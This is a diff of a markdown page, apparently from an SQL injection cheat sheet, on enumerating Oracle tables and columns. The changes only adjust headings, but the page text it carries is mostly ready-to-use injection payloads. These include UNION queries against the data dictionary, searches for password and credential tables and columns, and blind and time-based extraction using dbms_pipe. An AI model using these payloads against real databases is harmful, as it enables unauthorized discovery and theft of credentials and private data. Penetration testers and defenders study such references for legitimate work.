@@ -7,11 +7,9 @@ tags: ["tables", "columns", "schema", "enumeration"]
 lastUpdated: 2025-03-15
 ---
 
-## Tables and Columns
-
 Enumerating tables and columns is a critical step in Oracle SQL injection attacks. Oracle stores metadata about all database objects in the data dictionary, a set of tables and views that contain information about the database structure.
 
-### Data Dictionary Views
+## Data Dictionary Views
 
 Oracle provides several data dictionary views to query database structure:
 
@@ -25,7 +23,7 @@ Oracle provides several data dictionary views to query database structure:
 | `DBA_TAB_COLUMNS`  | All columns in the database       | Complete column information (requires privileges) |
 | `ALL_OBJECTS`      | All objects accessible to user    | Objects by type (TABLE, VIEW, etc.)               |
 
-### Basic Table Enumeration
+## Basic Table Enumeration
 
 ```sql
 -- List all tables accessible to current user
@@ -44,7 +42,7 @@ SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='SYSTEM'
 SELECT OWNER, COUNT(*) FROM ALL_TABLES GROUP BY OWNER
 ```
 
-### Column Enumeration
+## Column Enumeration
 
 ```sql
 -- List columns for a specific table
@@ -60,9 +58,9 @@ SELECT TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%USE
 SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='EMPLOYEES' AND ROWNUM <= 10
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### UNION-Based Enumeration
+### UNION-Based Enumeration
 
 ```sql
 -- Enumerate table names
@@ -75,7 +73,7 @@ SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='EMPLOYEES' AND ROWNUM 
 ' UNION SELECT COLUMN_NAME,DATA_TYPE FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'--
 ```
 
-#### Finding Sensitive Tables
+### Finding Sensitive Tables
 
 ```sql
 -- Tables likely containing user data
@@ -85,7 +83,7 @@ SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='EMPLOYEES' AND ROWNUM 
 ' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES WHERE TABLE_NAME LIKE '%PASS%' OR TABLE_NAME LIKE '%CRED%' OR TABLE_NAME LIKE '%AUTH%'--
 ```
 
-#### Finding Sensitive Columns
+### Finding Sensitive Columns
 
 ```sql
 -- Columns likely containing password data
@@ -95,9 +93,9 @@ SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='EMPLOYEES' AND ROWNUM 
 ' UNION SELECT TABLE_NAME||'.'||COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%USER%' OR COLUMN_NAME LIKE '%NAME%'--
 ```
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### Using ROWNUM for Pagination
+### Using ROWNUM for Pagination
 
 In Oracle, ROWNUM is used for pagination, which is useful when dealing with large result sets:
 
@@ -109,21 +107,21 @@ In Oracle, ROWNUM is used for pagination, which is useful when dealing with larg
 ' UNION SELECT TABLE_NAME,NULL FROM (SELECT TABLE_NAME, ROWNUM AS rn FROM ALL_TABLES) WHERE rn BETWEEN 11 AND 20--
 ```
 
-#### Subquery Factoring (WITH Clause)
+### Subquery Factoring (WITH Clause)
 
 ```sql
 -- Find tables with interesting column combinations
 ' UNION SELECT t.table_name, c.column_name FROM ALL_TABLES t JOIN ALL_TAB_COLUMNS c ON t.table_name=c.table_name WHERE c.column_name LIKE '%PASS%'--
 ```
 
-#### Using Data Dictionary Cache
+### Using Data Dictionary Cache
 
 ```sql
 -- Query the data dictionary cache
 ' UNION SELECT NAME,NAMESPACE FROM v$db_object_cache WHERE TYPE='TABLE'--
 ```
 
-### Blind Enumeration
+## Blind Enumeration
 
 For blind SQL injection, character-by-character extraction:
 
@@ -139,7 +137,7 @@ For time-based blind:
 ' AND (CASE WHEN ASCII(SUBSTR((SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1),1,1))=65 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
-### Counting Objects
+## Counting Objects
 
 ```sql
 -- Count tables in each schema
@@ -149,7 +147,7 @@ For time-based blind:
 ' UNION SELECT 'Columns in USERS: '||COUNT(*),NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'--
 ```
 
-### Finding Data Types
+## Finding Data Types
 
 ```sql
 -- Get distribution of column data types
@@ -159,7 +157,7 @@ For time-based blind:
 ' UNION SELECT TABLE_NAME||'.'||COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE DATA_TYPE IN ('BLOB','CLOB')--
 ```
 
-### System Tables of Interest
+## System Tables of Interest
 
 ```sql
 -- Check for existence of common sensitive tables
